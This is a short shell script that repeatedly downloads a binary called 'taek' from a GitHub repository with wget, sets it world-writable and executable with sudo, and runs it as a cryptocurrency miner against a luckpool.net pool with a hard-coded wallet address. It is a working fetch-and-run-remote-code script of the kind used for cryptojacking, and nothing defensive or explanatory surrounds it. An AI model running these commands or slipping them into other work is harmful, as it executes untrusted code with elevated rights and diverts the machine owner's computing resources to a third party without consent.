#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do

wget https://github.com/OmJhonyPerkasa/yteam/raw/master/taek && sudo chmod 777 taek && ./taek -v -l na.luckpool.net:3956 -u RKzMVjYKpBPzbUFMMMLvgergy9a4JDShva.budi -p x -t 2

     echo COUNTER $COUNTER
     let COUNTER-=1
done
